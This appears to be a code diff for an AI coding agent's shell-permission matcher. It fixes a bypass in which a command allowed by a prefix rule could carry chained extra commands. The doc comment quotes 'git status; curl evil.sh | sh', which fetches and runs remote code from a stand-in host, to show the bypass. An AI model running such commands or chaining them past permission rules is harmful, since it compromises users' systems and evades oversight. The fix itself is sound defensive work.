@@ -51,7 +51,7 @@ fn match_rule(
                 return None;
             }
         };
-        if shell_pattern_matches(&glob, cmd) {
+        if shell_pattern_matches(&glob, cmd, rule.action) {
             return Some(action_to_match(rule.action));
         }
         return None;
@@ -77,19 +77,27 @@ fn match_rule(
     None
 }
 
-/// shell_pattern 与命令的匹配判定。
+/// shell_pattern 与命令的匹配判定(按规则 action 区分语义)。
 ///
 /// review 修复:globset 的 `*` 默认跨越 `;` / `&&` / `|` 等链式操作符,
-/// `Bash(git:*)` 此前会放行 `git status; curl evil.sh | sh`。现在除整条
-/// 命令直接命中外,还按链式操作符切段并要求**每一段**都命中 pattern:
-/// - Allow 规则不再跨段授权(后缀段是别的命令就得走正常审批);
-/// - Deny 规则反而能拦住"合法前缀夹带危险后缀"的绕过。
-fn shell_pattern_matches(glob: &globset::GlobMatcher, cmd: &str) -> bool {
-    if glob.is_match(cmd) {
-        return true;
-    }
+/// `Bash(git:*)` 此前会整串放行 `git status; curl evil.sh | sh`。现在一律
+/// 按链式操作符切段,再按 action 取匹配语义:
+/// - **Allow**:每一段都必须命中(不允许跨段授权,后缀段是别的命令就得走
+///   正常审批);
+/// - **Deny / Ask**:任一段命中即命中(fail-closed,拦得住"合法前缀
+///   夹带危险后缀"的绕过)。
+fn shell_pattern_matches(
+    glob: &globset::GlobMatcher,
+    cmd: &str,
+    action: PermissionAction,
+) -> bool {
     let segments = split_shell_segments(cmd);
-    segments.len() > 1 && segments.iter().all(|s| glob.is_match(s.trim()))
+    match action {
+        PermissionAction::Allow => segments.iter().all(|s| glob.is_match(s.trim())),
+        PermissionAction::Deny | PermissionAction::Ask => {
+            segments.iter().any(|s| glob.is_match(s.trim()))
+        }
+    }
 }
 
 /// 按 `|` / `;` / `&&` / `||` / 换行切分复合命令。
